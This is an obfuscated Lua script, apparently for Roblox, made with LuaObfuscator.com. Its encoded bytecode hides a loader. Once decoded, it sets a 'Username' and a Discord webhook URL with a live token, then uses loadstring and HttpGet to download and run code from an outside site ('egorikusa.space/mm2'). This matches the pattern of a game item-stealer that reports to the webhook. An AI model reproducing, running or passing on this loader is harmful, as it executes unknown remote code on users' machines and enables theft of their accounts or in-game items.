--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.6) ~  Much Love, Ferib 

]]--

local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local FlatIdent_12703 = 0;
			local a;
			while true do
				if (FlatIdent_12703 == 0) then
					a = Char(StrToNumber(byte, 16));
					if repeatNext then
						local FlatIdent_2BD95 = 0;
						local b;
						while true do
							if (FlatIdent_2BD95 == 1) then
								return b;
							end
							if (FlatIdent_2BD95 == 0) then
								b = Rep(a, repeatNext);
								repeatNext = nil;
								FlatIdent_2BD95 = 1;
							end
						end
					else
						return a;
					end
					break;
				end
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
			return Res - (Res % 1);
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local FlatIdent_60EA1 = 0;
		local a;
		while true do
			if (FlatIdent_60EA1 == 1) then
				return a;
			end
			if (FlatIdent_60EA1 == 0) then
				a = Byte(ByteString, DIP, DIP);
				DIP = DIP + 1;
				FlatIdent_60EA1 = 1;
			end
		end
	end
	local function gBits16()
		local a, b = Byte(ByteString, DIP, DIP + 2);
		DIP = DIP + 2;
		return (b * 256) + a;
	end
	local function gBits32()
		local a, b, c, d = Byte(ByteString, DIP, DIP + 3);
		DIP = DIP + 4;
		return (d * 16777216) + (c * 65536) + (b * 256) + a;
	end
	local function gFloat()
		local Left = gBits32();
		local Right = gBits32();
		local IsNormal = 1;
		local Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
		local Exponent = gBit(Right, 21, 31);
		local Sign = ((gBit(Right, 32) == 1) and -1) or 1;
		if (Exponent == 0) then
			if (Mantissa == 0) then
				return Sign * 0;
			else
				Exponent = 1;
				IsNormal = 0;
			end
		elseif (Exponent == 2047) then
			return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
		end
		return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
	end
	local function gString(Len)
		local Str;
		if not Len then
			Len = gBits32();
			if (Len == 0) then
				return "";
			end
		end
		Str = Sub(ByteString, DIP, (DIP + Len) - 1);
		DIP = DIP + Len;
		local FStr = {};
		for Idx = 1, #Str do
			FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
		end
		return Concat(FStr);
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local FlatIdent_8F047 = 0;
		local Instrs;
		local Functions;
		local Lines;
		local Chunk;
		local ConstCount;
		local Consts;
		while true do
			if (2 == FlatIdent_8F047) then
				for Idx = 1, gBits32() do
					local FlatIdent_61B23 = 0;
					local Descriptor;
					while true do
						if (FlatIdent_61B23 == 0) then
							Descriptor = gBits8();
							if (gBit(Descriptor, 1, 1) == 0) then
								local Type = gBit(Descriptor, 2, 3);
								local Mask = gBit(Descriptor, 4, 6);
								local Inst = {gBits16(),gBits16(),nil,nil};
								if (Type == 0) then
									local FlatIdent_E652 = 0;
									while true do
										if (0 == FlatIdent_E652) then
											Inst[3] = gBits16();
											Inst[4] = gBits16();
											break;
										end
									end
								elseif (Type == 1) then
									Inst[3] = gBits32();
								elseif (Type == 2) then
									Inst[3] = gBits32() - (2 ^ 16);
								elseif (Type == 3) then
									Inst[3] = gBits32() - (2 ^ 16);
									Inst[4] = gBits16();
								end
								if (gBit(Mask, 1, 1) == 1) then
									Inst[2] = Consts[Inst[2]];
								end
								if (gBit(Mask, 2, 2) == 1) then
									Inst[3] = Consts[Inst[3]];
								end
								if (gBit(Mask, 3, 3) == 1) then
									Inst[4] = Consts[Inst[4]];
								end
								Instrs[Idx] = Inst;
							end
							break;
						end
					end
				end
				for Idx = 1, gBits32() do
					Functions[Idx - 1] = Deserialize();
				end
				return Chunk;
			end
			if (FlatIdent_8F047 == 0) then
				Instrs = {};
				Functions = {};
				Lines = {};
				Chunk = {Instrs,Functions,nil,Lines};
				FlatIdent_8F047 = 1;
			end
			if (FlatIdent_8F047 == 1) then
				ConstCount = gBits32();
				Consts = {};
				for Idx = 1, ConstCount do
					local Type = gBits8();
					local Cons;
					if (Type == 1) then
						Cons = gBits8() ~= 0;
					elseif (Type == 2) then
						Cons = gFloat();
					elseif (Type == 3) then
						Cons = gString();
					end
					Consts[Idx] = Cons;
				end
				Chunk[3] = gBits8();
				FlatIdent_8F047 = 2;
			end
		end
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				local FlatIdent_77C29 = 0;
				while true do
					if (FlatIdent_77C29 == 0) then
						Inst = Instr[VIP];
						Enum = Inst[1];
						FlatIdent_77C29 = 1;
					end
					if (FlatIdent_77C29 == 1) then
						if (Enum <= 5) then
							if (Enum <= 2) then
								if (Enum <= 0) then
									local FlatIdent_2AC68 = 0;
									local A;
									local Results;
									local Limit;
									local Edx;
									while true do
										if (FlatIdent_2AC68 == 2) then
											for Idx = A, Top do
												Edx = Edx + 1;
												Stk[Idx] = Results[Edx];
											end
											break;
										end
										if (FlatIdent_2AC68 == 0) then
											A = Inst[2];
											Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
											FlatIdent_2AC68 = 1;
										end
										if (FlatIdent_2AC68 == 1) then
											Top = (Limit + A) - 1;
											Edx = 0;
											FlatIdent_2AC68 = 2;
										end
									end
								elseif (Enum == 1) then
									local FlatIdent_1B1BA = 0;
									local A;
									local B;
									while true do
										if (FlatIdent_1B1BA == 0) then
											A = Inst[2];
											B = Stk[Inst[3]];
											FlatIdent_1B1BA = 1;
										end
										if (FlatIdent_1B1BA == 1) then
											Stk[A + 1] = B;
											Stk[A] = B[Inst[4]];
											break;
										end
									end
								else
									local Edx;
									local Results, Limit;
									local B;
									local A;
									Stk[Inst[2]] = Env[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									B = Stk[Inst[3]];
									Stk[A + 1] = B;
									Stk[A] = B[Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Inst[3];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
									Top = (Limit + A) - 1;
									Edx = 0;
									for Idx = A, Top do
										Edx = Edx + 1;
										Stk[Idx] = Results[Edx];
									end
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]]();
									VIP = VIP + 1;
									Inst = Instr[VIP];
									VIP = Inst[3];
								end
							elseif (Enum <= 3) then
								Stk[Inst[2]] = Inst[3];
							elseif (Enum > 4) then
								VIP = Inst[3];
							else
								Stk[Inst[2]] = Env[Inst[3]];
							end
						elseif (Enum <= 8) then
							if (Enum <= 6) then
								do
									return;
								end
							elseif (Enum == 7) then
								Stk[Inst[2]]();
							else
								local A = Inst[2];
								Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
							end
						elseif (Enum <= 9) then
							Env[Inst[3]] = Stk[Inst[2]];
						elseif (Enum == 10) then
							for Idx = Inst[2], Inst[3] do
								Stk[Idx] = nil;
							end
						elseif (Stk[Inst[2]] == Inst[4]) then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
						VIP = VIP + 1;
						break;
					end
				end
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!0A3O00028O00026O00F03F030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574031B3O00682O7470733A2O2F65676F72696B7573612E73706163652F2O6D3203083O00557365726E616D65030A3O006A756C696162613O6D03073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F313236333832363234303538323731373436312F4147562O364A536376775F4F68414E645F5830476D766F356F5871575364334E54513946536A6D424546547643365A5573627A555176546E3553444A5075416C4B5A686C00223O0012033O00014O000A000100013O00260B3O0002000100010004053O00020001001203000100013O00260B0001000F000100020004053O000F0001001204000200033O001202000300043O00202O00030003000500122O000500066O000300056O00023O00024O00020001000100044O0021000100260B00010005000100010004053O00050001001203000200013O00260B00020019000100010004053O00190001001203000300083O001209000300073O0012030003000A3O001209000300093O001203000200023O00260B00020012000100020004053O00120001001203000100023O0004053O000500010004053O001200010004053O000500010004053O002100010004053O000200012O00063O00017O00", GetFEnv(), ...);